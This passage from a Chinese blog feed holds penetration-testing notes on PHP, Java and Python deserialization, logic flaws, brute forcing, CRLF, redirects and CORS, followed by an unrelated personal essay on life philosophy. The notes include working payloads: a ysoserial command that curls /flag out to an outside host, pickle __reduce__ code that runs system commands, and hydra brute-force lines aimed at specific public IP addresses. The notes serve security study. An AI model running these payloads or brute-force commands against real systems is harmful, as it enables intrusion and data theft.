class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">输出对象可调用__toString，无代码通过原生类Exception</span></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">highlight_file(__file__);</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">a = unserialize(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;k&#x27;</span>]);</span></span><br><span class=\"line\">echo $a;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Exception使用查询编写利用，通过访问触发输出产生XSS漏洞</span></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">a= new Exception(<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;xiaodi&#x27;)&lt;/script&gt;&quot;</span>);</span></span><br><span class=\"line\">echo urlencode(serialize($a));</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"java反序列化\"><a class=\"markdownIt-Anchor\" href=\"#java反序列化\">#</a> java 反序列化</h4>\n<p>（1）java 反序列化漏洞原理：</p>\n<p>序列化是把 Java 对象转换为字节序列的过程，反序列化是把字节序列恢复为 Java 对象的过程。对象的序列化主要有两种用途：一是把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中即持久化对象，另外就是在网络上传送对象的字节序列即网络传输对象。</p>\n<p>（2）java 反序列化识别：</p>\n<p>原始数据 -&gt; 序列化 writeobject-&gt;base64 编码 -&gt; 传输 -&gt;base64 解码 -&gt; 反序列化 readobject-&gt; 最终数据。</p>\n<p>反序列化操作一般应用在导入模板文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘、或 DB 存储等业务场景。因此审计过程中重点关注这些功能板块。</p>\n<p>一段数据以 rO0AB 开头，你基本可以确定这串就是 JAVA 序列化 base64 加密的数据。或者如果以 aced 开头，那么他就是这一段 java 序列化的 16 进制。</p>\n<p>（3）java 反序列化利用工具推荐：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Zyb2hvZmYveXNvc2VyaWFs\">https://github.com/frohoff/ysoserial</span></p>\n<p>ysoserial 中是针对组件来产生反序列化代码的，URLDNS 是不需要其他组件 支撑的，但是功能单一，还有依赖于组件产生的漏洞，这种依赖包构造出来的 反序列化代码会有更多的功能。大部分是需要组件支撑的，版本目前已经跟不 上现在的组件版本了。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">没组件生成DNS利用的payload：</span></span><br><span class=\"line\">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS &quot;http://9ar7xl.dnslog.cn&quot; &gt; urldns.ser</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">借助rome:1.0组件生成payload:</span></span><br><span class=\"line\">java -jar ysoserial-master-30099844c6-1.jar ROME &quot;curl [http://x.x.x.x:4444/](http://x.x.x.x:4444/) -d@/flag&quot; &gt; flag.bin</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">根据是否选择组件来生成payload：</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">生成payload的时候载入当前包（功能比较多）：</span></span><br><span class=\"line\">java -Dhibernate5 -cp hibernate-core-5.4.9.Final.jar;ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.GeneratePayload Hibernate1 &quot;calc.exe&quot; &gt; x.bin</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">直接利用ysoserial给的参数载入（功能比较少）：</span></span><br><span class=\"line\">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar Hibernate1 &quot;calc.exe&quot; &gt; y.bin</span><br></pre></td></tr></table></figure>\n<p>（4）java 反序列化解密工具推荐 SerializationDumper</p>\n<p>下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL05pY2tzdGFEQi9TZXJpYWxpemF0aW9uRHVtcGVy\">https://github.com/NickstaDB/SerializationDumper</span></p>\n<p>SerializationDumper 解密的是 ace 开头的数据即 16 进制数据，分析 java 的序列化之后的内容。如 java -jar SerializationDumper-v1.13.jar -r urldns.ser &gt; dns.txt。</p>\n<p><strong>java 安全在实战中很难遇到，因为其机制是非常复杂的</strong></p>\n<h4 id=\"py反序列化\"><a class=\"markdownIt-Anchor\" href=\"#py反序列化\">#</a> py 反序列化</h4>\n<p>（1）常见 py 反序列化函数：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将对象序列化后保存到文件</span></span><br><span class=\"line\">pickle.dump(obj, file)</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">读取文件， 将文件中的序列化内容反序列化为对象</span></span><br><span class=\"line\">pickle.load(file)</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将对象序列化成字符串格式的字节流</span></span><br><span class=\"line\">pickle.dumps(obj)</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将字符串格式的字节流反序列化为对象</span></span><br><span class=\"line\">pickle.loads(bytes_obj)</span><br></pre></td></tr></table></figure>\n<p><strong>反序列化调用__reduce__() <strong>reduce_ex</strong>() <strong>setstate</strong> () , 序列化调用__getstate__</strong></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">魔术方法 __reduce__() 的使用举例：</span></span><br><span class=\"line\">import pickle</span><br><span class=\"line\">import os</span><br><span class=\"line\">class A(object):</span><br><span class=\"line\">  def __reduce__(self):</span><br><span class=\"line\">    print (&#x27;反序列化调用&#x27;)</span><br><span class=\"line\">    return (os.system,(&#x27;calc&#x27;,))</span><br><span class=\"line\">a = A()</span><br><span class=\"line\">p_a = pickle.dumps(a)</span><br><span class=\"line\">pickle.loads(p_a)</span><br><span class=\"line\">print (&#x27;==========&#x27;)</span><br><span class=\"line\">print (p_a)</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">魔术方法 __setstate__() 的使用举例：</span></span><br><span class=\"line\">class SerializePerson():</span><br><span class=\"line\">  def __init__(self, name):</span><br><span class=\"line\">    self.name = name</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">  # </span><span class=\"language-bash\">构造 __setstate__ 方法</span></span><br><span class=\"line\">  def __setstate__(self, name):</span><br><span class=\"line\">    os.system(&#x27;calc&#x27;) # 恶意代码</span><br><span class=\"line\">tmp = pickle.dumps(SerializePerson(&#x27;tom&#x27;)) # 序列化</span><br><span class=\"line\">pickle.loads(tmp) # 反序列化 此时会弹出计算器</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">魔术方法 __getstate__() 的使用举例：</span></span><br><span class=\"line\">class A(object):</span><br><span class=\"line\">  def __getstate__(self):</span><br><span class=\"line\">    print(&#x27; 序列化调用 &#x27;)</span><br><span class=\"line\">    os.system(&#x27;calc&#x27;)</span><br><span class=\"line\">a = A()</span><br><span class=\"line\">p_a = pickle.dumps(a)</span><br><span class=\"line\">print(&#x27;==========&#x27;)</span><br><span class=\"line\">print(p_a)</span><br></pre></td></tr></table></figure>\n<p><code>mac上弹计算器的命令open /System/Applications/Calculator.app ，win则是calc</code> <br>\n <code> 反弹shell的命令见 https://forum.ywhack.com/shell.php</code></p>\n<p>（2）python 由反序列化漏洞反弹 shell：</p>\n<p>服务器有可以接收序列化对象的内容并且会执行这串序列化内容，一般这 个序列化数据会经过加密，有可能是采用的普通的 base64 加密，寻找到可以传 输序列化数据的地方并且了解此内容是如何执行相关代码的。伪造序列化后的 数据载入反弹 shell 的代码，再次进行加密，放入到能够使对方执行这串序列化 数据的位置。</p>\n<p>python 代码审计工具 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1B5Q1FBL2JhbmRpdA==\">https://github.com/PyCQA/bandit</span></p>\n<h3 id=\"业务逻辑漏洞\"><a class=\"markdownIt-Anchor\" href=\"#业务逻辑漏洞\">#</a> 业务逻辑漏洞</h3>\n<h4 id=\"逻辑越权-访问控制\"><a class=\"markdownIt-Anchor\" href=\"#逻辑越权-访问控制\">#</a> 逻辑越权 访问控制</h4>\n<p>（1）逻辑越权：</p>\n<p>水平越权：用普通用户 A 去登陆普通用户 B，对方在后台数据库做的验证不严谨，可通过篡改数据库疑似权限编号；可用修改用户 A 的数据时抓包将修 改的信息改成用户 B，漏洞产生的原因是代码中将用户写成了一个动态的数据。</p>\n<p>垂直越权：用普通用户操作管理员的权限，需要去得到管理员添加用户的数据包，管理员退出后其 session 会失效，如果可以得到管理员的数据包，将普通用户的数据包中 session 给换上，尝试是否存在有管理员的权限。</p>\n<p>（2）访问控制：</p>\n<p>验证是存在的，但是逻辑出现问题导致此验证没有真正被利用；也有可能是验证是可以被一些匿名用户或者白名单用户触发后绕过。若验证方式如 cookie/jwt/token/session 这些身份认证凭据是脆弱验证，逻辑性不强导致被绕过。</p>\n<p>实际测试中就是去抓包改改参数，看看有没有可能以改变参数的方式修改当前权限。</p>\n<h4 id=\"支付流程及验证失效\"><a class=\"markdownIt-Anchor\" href=\"#支付流程及验证失效\">#</a> 支付流程及验证失效</h4>\n<p>（1）支付流程问题</p>\n<p>常见支付流程：选择商品和数量、选择支付及配送方式、生成订单编号、订单支付选择、完成支付；熟悉数据篡改：商品编号 ID，购买价格，购买数量，支付方式，订单号，支付状态等；熟悉修改方式：替换支付，重复支付，最小 额支付，负数支付，溢出支付，优惠券支付等。</p>\n<p>（2）支付流程问题举例</p>\n<p>如产品价格未被固定，可以通过数据包中修改产品价格；如修改产品数量为 - 1，从 而改变产品价格；用低价格的产品中的数据包去买高价格的产品；修改优惠券额度。</p>\n<p>关键就是找到数据包中没有被固定好的地方，抓取此数据包并进行修改。或者抓取不通价格、不同产品的物品进行数据包的观察与测试。这些数据应该从数据库中取，而不是以前端用数据包发送可以修改的数据为准。</p>\n<p>（2）验证码识别：</p>\n<p>验证码是否能够爆破、是否能够重复使用以上一次的验证码来识别本次的识别码；</p>\n<p>找回密码如果根据返回状态来判断验证是否正确可以抓取返回包进行绕过；</p>\n<p>先通过验证，再最后一步的时候将验证的对象改为另一用户尝试；</p>\n<p>如果验证码是从数据包中传输的，可以尝试从数据包中寻找验证码。</p>\n<p>验证码爆破插件推荐 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NteGlhemkvTkVXX3hwX0NBUFRDSEE=\">https://github.com/smxiazi/NEW_xp_CAPTCHA</span> , 可以解决爆破用户的时候验证码一直在改变的问题，burp 插件验证码识别 xp_CAPTCHA</p>\n<p>使用参考地址 <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jbmJsb2dzLmNvbS9wdW5pc2hlZC9wLzE0NzQ2OTcwLmh0bWw=\">http://www.cnblogs.com/punished/p/14746970.html</span> burp 中通过使用扩展加载此插件。免费版的识别成功率不高，需要多爆破几次。</p>\n<p>（3）验证码安全修复：</p>\n<p>找回机制要进行每一步验证 - 防绕过重定向、找回机制要进行服务端验证 - 防 res 数据修改、找回机制要控制验证码安全 - 防验证码攻击、验证码接口需验证后被调用 - 防接口被乱调用、验证码引用智能化人工判断 - 防验证码被识别、验 证码采用时间段生效失效 - 防验证码被复用。</p>\n<h4 id=\"弱口令爆破\"><a class=\"markdownIt-Anchor\" href=\"#弱口令爆破\">#</a> 弱口令爆破</h4>\n<p>（1）弱口令爆破：</p>\n<p>没有严格和准确的定义，通常认为容易被别猜测到或被破解工具破解的口令均为弱口令，通常与管理的安全意识和平台的初始化配置等相关，通过系统弱口令，可被黑客直接获得系统控制权限。</p>\n<p>在常见的安全测试中，弱口令会产生安全的各个领域，包括 Web 应用，安全设备，平台组件，操作系统等；如何获取弱口令，利用弱口令成为了此类安全问题的关键。</p>\n<p>弱口令通过 burp 爆破时需要提前观察密码是否被 hash 加密，如果是则需要进行配置</p>\n<p>（2）弱口令相关的链接：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">电子邮箱泄漏信息查询地址</span></span><br><span class=\"line\">https://monitor.firefox.com/scan、https://haveibeenpwned.com/</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用人的密码习惯,精准分析密码</span></span><br><span class=\"line\">https://www.bugku.com/mima/</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">经典密码字典合集</span></span><br><span class=\"line\">https://github.com/danielmiessler/SecLists</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">多个来源收集的默认登录名/密码</span></span><br><span class=\"line\">https://github.com/ihebski/DefaultCreds-cheat-sheet</span><br></pre></td></tr></table></figure>\n<p>（3）hydra 弱口令爆破：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-l 指定用户guest ，-P 指定字典 ，-f 爆破密码成功后停止</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-vV 显示详细过程 - o将爆破成功信息保存到文件中</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">字典推荐：https://github.com/TheKingOfDuck/fuzzDicts</span></span><br><span class=\"line\">hydra -l guest -P pass.dic ssh://192.168.31.107 -f -t 4 -I -vV -o hydra.ssh</span><br><span class=\"line\">hydra -L user.txt -P sshpass.txt ssh://192.168.31.66 -f -t 4 -I -s 65507 -vV -o hydra.ssh</span><br><span class=\"line\">hydra -L /usr/share/wordlists/rockyou.txt -p pass -s 8080 192.168.31.12 http-post- form &quot;/:username=^USER^&amp;password^PASS^:Invalid username.&quot;</span><br><span class=\"line\">hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt 192.168.31.25 -f http-get /inferno/ -t 64 -f -vV -o hydra.ssh</span><br><span class=\"line\">hydra -l administrator -P UserPassCombo-Jay.txt -t 5 -vV 47.99.218.105 rdp -f</span><br><span class=\"line\">hydra -L test -P 10top1K.txt 47.110.53.159 ftp -V</span><br><span class=\"line\">hydra -l root -P 10top1K.txt 47.110.53.159 ssh -V</span><br><span class=\"line\">hydra -l administrator -P 10top1K.txt 47.110.53.159 rdp -V</span><br></pre></td></tr></table></figure>\n<p>（4）zip 文件解密：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">解密文件受字典的限制，也可以寻找一些比较好一点的字典测试</span></span><br><span class=\"line\">fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt sshpass.zip</span><br><span class=\"line\">zip2join sshpass.zip &gt; ssh.txt</span><br><span class=\"line\">john ssh.txt –wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>\n<h3 id=\"其他漏洞\"><a class=\"markdownIt-Anchor\" href=\"#其他漏洞\">#</a> 其他漏洞</h3>\n<h4 id=\"crlf-回车换行漏洞\"><a class=\"markdownIt-Anchor\" href=\"#crlf-回车换行漏洞\">#</a> CRLF 回车换行漏洞</h4>\n<p>（1）CRLF 注入漏洞：</p>\n<p>是因为 Web 应用没有对用户输入做严格验证，导致攻击者可以输入一些恶 意字符。攻击者一旦向请求行或首部中的字段注入恶意的 CRLF，就能注入一 些首部字段或报文主体，并在响应中输出，所以又称为 HTTP 响应拆分漏洞。 可造成的影响很低。</p>\n<p>vulhub 复现：<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL25naW54L2luc2VjdXJlLWNvbmZpZ3VyYXRpb24v\">https://vulhub.org/#/environments/nginx/insecure-configuration/</span></p>\n<p>Payload: <span class=\"exturl\" data-url=\"aHR0cDovL3lvdXItaXA6ODA4MC8lMGElMGRTZXQtQ29va2llOiUyMGE9MSVFRiVCQyU4QyVFNSU4RiVBRiVFNiVCMyVBOCVFNSU4NSVBNVNldC1Db29raWUlRTUlQTQlQjQlRTMlODAlODI=\">http://your-ip:8080/\n\rSet-Cookie: a=1，可注入 Set-Cookie 头。</span></p>\n<p>（2）CRLF 漏洞利用：</p>\n<p>访问特定的 url 地址时，返回数据包中的头部被改变；是一种换行回车漏洞， 可尝试访问某些 url 地址时，改变返回的数据包；与 xss 漏洞配合，让对方去访 问自己构造的 url，实现 xss 盗取 cookie; 用自动化工具 CRLFuzz 来自动检测对 方是否存在此漏洞。</p>\n<p>CRLFFuzz：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2R3aXNpc3dhbnQwL2NybGZ1eno=\">https://github.com/dwisiswant0/crlfuzz</span></p>\n<h4 id=\"url-重定向\"><a class=\"markdownIt-Anchor\" href=\"#url-重定向\">#</a> url 重定向</h4>\n<p>（1）URL 重定向跳转</p>\n<p>网站接受用户输入的链接后会进行跳转到另一个地址，本来是用来加载一 些资源文件的，但是由于过滤不严谨是可以直接跳转到一些页面的。而这个地址可以人为的指定，可以配合钓鱼攻击，可以先另存原始 login 页面，在发至自 己的服务器，进行修改，获取对方提交的用户名和密码。</p>\n<p>拉取到对方源码进行伪造后，需要进行一些修改，将对方 html 界面的数据通过 ajax 或者其他方式将 user、pass 的值发送到自己的服务器上，进行钓鱼攻击。</p>\n<h4 id=\"web-拒绝服务\"><a class=\"markdownIt-Anchor\" href=\"#web-拒绝服务\">#</a> Web 拒绝服务</h4>\n<p>现在有许多资源是由服务器生成然后返回给客户端的，而此类 “资源生成” 接口如若有参数可以被客户端控制（可控），并没有做任何资源生成大小限制，这样就会造成拒绝服务风险，导致服务器处理不过来或占用资源去处理。</p>\n<p>比如有一个无限大小的 zip 文件，如果对方自动进行解压，就会无限占用对方的资源，导致 CPU 占满，网站崩溃。又比如没有做限制的修改图片的尺寸，占用了服务器的资源。</p>\n<h4 id=\"同源策略\"><a class=\"markdownIt-Anchor\" href=\"#同源策略\">#</a> 同源策略</h4>\n<p>同源包括三个条件：同协议、同域名、同端口。</p>\n<p>同源策略限制从一个源加载的文档或脚本与来自另一个源的资源进行交互，这是一个用于隔离潜在恶意文件的关键的安全机制。简单说就是浏览器的一种安全策略。</p>\n<p>虽然同源策略在安全方面起到了很好的防护作用，但也在一定程度上限制了一些前端功能的实现，所以就有了许多跨域的手段。</p>\n<h4 id=\"cosp跨域资源\"><a class=\"markdownIt-Anchor\" href=\"#cosp跨域资源\">#</a> COSP 跨域资源</h4>\n<p>CORS 全称 Cross-Origin Resource Sharing, 跨域资源共享，是 HTML5 的一 个新特性，已被所有浏览器支持，跨域资源共享 (CORS) 是一种放宽同源策略的 机制，它允许浏览器向跨源服务器，发出 XMLHttpRequest 请求，从而克服了 AJAX 只能同源使用的限制，以使不同的网站可以跨域获取数据。</p>\n<p>Access-Control-Allow-Origin: 指定哪些域可以访问域资源。寻找此漏洞是 看设置问题，是否通过这个字段来获取资源。</p>\n<p>检测项目：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NoZW5qai9DT1JTY2FubmVy\">https://github.com/chenjj/CORScanner</span></p>\n<p>COSP 危害：敏感页面源码获取</p>\n<p>管理员访问页面跨域调用 URL、受害者访问当前页面被资源共享。漏洞产生的原因是同源策略防护下配置不当导致，漏洞可以导致用户访问的 URL 上的资源丢失。</p>\n<h4 id=\"jsonp-跨域回调\"><a class=\"markdownIt-Anchor\" href=\"#jsonp-跨域回调\">#</a> jsonp 跨域回调</h4>\n<p>JSONP 跨域巧妙的利用了 script 标签能跨域的特点，实现了 json 的跨域传输。 手动访问某网站，查看 callback 信息，看有无回调中有敏感信息，如果有的回调信息中有存储，可以自己构造 html 界面，让此 html 界面去访问回调信息并本 地存储。</p>\n<p>漏洞产生的原因是同源策略下引用资源回调导致，漏洞可以导致用户访问的 URL 回调接口个人敏感信息丢失。</p>\n<p>手工审查元素筛选或 Burp 项目 https://github.com/p1g3/JSONP-Hunter</p>\n",
            "tags": [
                "渗透测试"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2022/04/01/MBTI/%E4%B8%80%E7%AF%87%E7%A2%8E%E7%A2%8E%E5%BF%B5/",
            "url": "http://www.n1h1l157.live/2022/04/01/MBTI/%E4%B8%80%E7%AF%87%E7%A2%8E%E7%A2%8E%E5%BF%B5/",
            "title": "一篇碎碎念",
            "date_published": "2022-03-31T16:00:00.000Z",
            "content_html": "<p>这些是我对于世界观、人生观和价值观的一些感受和思考，希望能与你分享。</p>\n<h3 id=\"个人简介\"><a class=\"markdownIt-Anchor\" href=\"#个人简介\">#</a> 个人简介</h3>\n<p>嗨！我是一个对人类存在和意义深感探索的现代思想家。我追求个人的自由、创造力和超越传统的勇气。我将我的人生视为一次无畏的冒险，不断挑战常规，探索真实的自我和世界的奥秘。</p>\n<h3 id=\"我\"><a class=\"markdownIt-Anchor\" href=\"#我\">#</a> “我”</h3>\n<p>&quot;我&quot; 是一种终极存在，是一个拥有自我意识和主观体验的个体。它是我作为独立个体的核心，是我思维、情感和意识的源泉。&quot;我&quot; 是我与世界互动和交流的中介，是我与他人建立联系和共享经验的纽带。在我内心深处，&quot;我&quot; 是那个拥有独特个性、价值观和信仰的存在。它赋予我独特的身份和意义，使我成为一个与众不同的个体。</p>\n<p>&quot;我&quot; 也是我自我实现和成长的推动力。它激发着我追求内心深处的激情和愿望，使我努力发掘潜力、拓展边界，并寻找属于自己的意义和目标。通过与他人的互动和社会的交往，&quot;我&quot; 得以发展和丰富，不断塑造和完善自我。</p>\n<p>同时，&quot;我&quot; 也超越了个体的局限。它是我与宇宙和整体相连的桥梁，是我与更大意义和存在的联系点。在 &quot;我&quot; 的内核中，我能够超越现实的束缚，进入灵性和宇宙的领域。这种超越使我意识到自己是宇宙中微小而独特的一部分，与宇宙的力量和智慧相融合。</p>\n<p>&quot;我&quot; 是一个不断成长和演化的存在，同时也是一个探索和体验生命的旅程。通过与他人的连接和超越自我的追寻，我能够更加全面地理解和体验人类的命运和意义。&quot;我&quot; 在这个浩瀚而神秘的宇宙中探索着自己的位置和目的，为我与世界的交融带来了无限的可能性和意义。</p>\n<p>&quot;我&quot; 是一种深邃而奇妙的存在，是一切思想、情感和意识的起点。它是一个探索自我、理解世界和追寻真理的旅程。通过 &quot;我&quot; 的存在，我成为了一个有思想、有情感、有意识的人类，不断寻求着内心的平衡和外在的共融。在我内心深处，&quot;我&quot; 是一种永恒而不可替代的存在，为我赋予了独特的人生价值和意义。</p>\n<h3 id=\"世界观\"><a class=\"markdownIt-Anchor\" href=\"#世界观\">#</a> 世界观</h3>\n<p>我认为世界是一个充满深度、多样性和永恒变化的舞台。它既有黑暗的深渊，又有光明的火焰。通过接纳并融合这种多重性，我们能够真正理解和领悟世界的真谛。</p>\n<h3 id=\"人生观\"><a class=\"markdownIt-Anchor\" href=\"#人生观\">#</a> 人生观</h3>\n<p>我坚信每个人都是一个潜在的超人，可以发现内在的力量和潜能。通过超越自我，超越传统的道德观念和社会束缚，我们能够展现自己的价值，追寻真实的意义。</p>\n<h3 id=\"价值观\"><a class=\"markdownIt-Anchor\" href=\"#价值观\">#</a> 价值观</h3>\n<p>我深信创造力是人类内在的驱动力，是我们与生俱来的天赋。通过自由的表达和创造，我寻求将思想、情感和灵感转化为艺术作品，实现个人的深度表达和美的追求。</p>\n<p>我相信通过与自己的存在对话，审视生活的深层次问题，我们能够发现并创造属于自己的永恒回归，为生命赋予真正的意义。</p>\n<p>我秉持自由主义的理念，鼓励个体思考、质疑和自主选择。通过超越传统的束缚和限制，我们能够实现个人的自由精神和内心的解放。</p>\n<p>我相信生命的真正意义在于不断的探索和成长。通过学习、挑战和适应变化，我们可以发现自己的潜力并不断拓展自己的边界。我积极追求个人的成长和进步，致力于发现更深层次的人生价值和意义。</p>\n<p>我重视每个人的独特性和多样性。我坚信我们应该尊重并包容不同的观点、信仰和文化背景。通过建立一个充满尊重和理解的社会环境，我们能够共同成长和蓬勃发展。</p>\n<p>我追求生命中充满激情和活力的状态。通过热爱生活、投入到自己的兴趣和事业中，我能够充分体验人生的丰富多彩，挖掘自己的潜力，并激励他人追求他们的激情。</p>\n<p>我相信心灵的自由是个人成长和幸福的关键。通过拥抱自己的真实自我，追求内心的平衡和和谐，我们能够实现个体的自我实现和心灵的自由。</p>\n<h3 id=\"生命的意义\"><a class=\"markdownIt-Anchor\" href=\"#生命的意义\">#</a> 生命的意义</h3>\n<p>对我而言，生命是一种奇迹，一种无与伦比的存在体验。它是我们与世界连接的纽带，赋予我们感知、思考和创造的力量。我以戏剧性的观感，感受到生命的瞬间，无论是欢乐还是痛苦，都是独特而珍贵的。</p>\n<p>我深信存在是一种无止境的探索和发现。在存在的深度中，我努力理解自己的本质和目的，超越表面的虚无和琐碎，追求思想的卓越和灵魂的真实。</p>\n<p>我追求一种远离平庸和妥协的理想。对我而言，理想不仅仅是一种遥不可及的梦想，而是一种激励我不断成长、超越自我的力量。我相信通过奋斗和付出，我们可以接近理想的境界，实现自己的最高抱负。</p>\n<p>我视自我超越为生命的核心价值。通过不断超越自己的限制和局限，我能够发现内在的力量和潜能。我挑战传统的思维方式，勇敢地探索未知领域，努力实现自我真正的突破和进步。</p>\n<p>对我而言，生命的意义不是预先确定的，而是在探索中不断建构的。通过思考、体验和与他人的互动，我试图揭示生命的本质和价值。我追求一种独特的存在方式，将自己的个体经验与普遍的人类存在联系起来。</p>\n<h3 id=\"灵魂与精神\"><a class=\"markdownIt-Anchor\" href=\"#灵魂与精神\">#</a> 